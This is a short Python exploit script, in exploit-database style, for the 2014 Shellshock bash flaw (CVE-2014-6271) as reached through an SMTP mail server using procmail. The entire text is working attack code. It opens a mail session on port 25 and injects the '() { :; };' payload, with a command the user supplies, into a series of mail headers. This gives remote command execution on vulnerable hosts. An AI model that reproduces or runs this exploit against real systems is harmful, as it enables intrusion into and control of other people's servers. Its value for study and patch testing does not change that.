#!/bin/python
# Exploit Title:  Shellshock SMTP Exploit
# Date: 10/3/2014
# Exploit Author: fattymcwopr
# Vendor Homepage: gnu.org
# Software Link: http://ftp.gnu.org/gnu/bash/
# Version: 4.2.x < 4.2.48
# Tested on: Debian 7 (postfix smtp server w/procmail)
# CVE : 2014-6271

from socket import *
import sys

def usage():
    print "shellshock_smtp.py <target> <command>"

argc = len(sys.argv)
if(argc < 3 or argc > 3):
    usage()
    sys.exit(0)

rport = 25
rhost = sys.argv[1]
cmd = sys.argv[2]

headers = ([
    "To",
    "References",
    "Cc",
    "Bcc",
    "From",
    "Subject",
    "Date",
    "Message-ID",
    "Comments",
    "Keywords",
    "Resent-Date",
    "Resent-From",
    "Resent-Sender"
    ])

s = socket(AF_INET, SOCK_STREAM)
s.connect((rhost, rport))

# banner grab
s.recv(2048*4)

def netFormat(d):
    d += "\n"
    return d.encode('hex').decode('hex')

data = netFormat("mail from:<>")
s.send(data)
s.recv(2048*4)

data = netFormat("rcpt to:<nobody>")
s.send(data)
s.recv(2048*4)

data = netFormat("data")
s.send(data)
s.recv(2048*4)

data = ''
for h in headers:
    data += netFormat(h + ":() { :; };" + cmd)

data += netFormat(cmd)

# <CR><LF>.<CR><LF>
data += "0d0a2e0d0a".decode('hex')

s.send(data)
s.recv(2048*4)

data = netFormat("quit")
s.send(data)
s.recv(2048*4)